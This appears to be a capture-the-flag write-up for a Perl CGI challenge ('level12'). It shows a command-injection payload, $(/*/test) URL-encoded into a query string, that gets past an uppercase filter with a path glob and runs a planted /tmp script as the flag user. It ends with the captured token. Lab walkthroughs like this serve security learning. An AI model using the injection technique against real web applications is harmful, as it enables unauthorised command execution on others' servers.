RESOLUTION:
	ls -l
		=> -rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
			=> Let's read then
	netstat -plunt
		=> tcp6       0      0 :::4646                 :::*
			=> Indeed a server is listening on port 4646
	cat level12.pl
		=> query string params are x and y
		=> t(x, y)
		=> @output = `egrep "^$xx" /tmp/xd 2>&1`;
			=> Looks like a bash command
			=> xx being the first function argument which got modified
		=> Whatever happens, the output will be "." or ".."
	perl test.pl
		=> Reproduces the regex locally
			=> $xx =~ tr/a-z/A-Z/;
				=> translate lowercase to uppercase
			=> $xx =~ s/\s.*//;
				=> substitute all that follows a space with an empty string
		=> Then it is passed to the interpreted @output line
	Lets sum up:
		querystring = x=&y=whatever

		=> Our query string must be in the form of $(...) or `...` to be interpreted
		querystring = x=$()&y=whatever

		=> toupper(x) must give an executable
			=> We can only create a file in /tmp
			=> /tmp would become /TMP
			=> Need an non alpha
		querystring = x=$(/*/test)&y=whatever		
				=> will become /*/TEST
		=> We need to redirect the output as we wont have it through the webpage
			=> we could redirect it through the query string but it's easier to do it through the executable

	echo 'getflag > /tmp/res' > /tmp/TEST
	chmod 755 /tmp/TEST
	Encode url:
		=> $(/*/test) = %24%28%2F%2A%2Ftest%29
	http://[IP]?x=%24%28%2F%2A%2Ftest%29&y=whatever
	cat /tmp/res
		=> Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
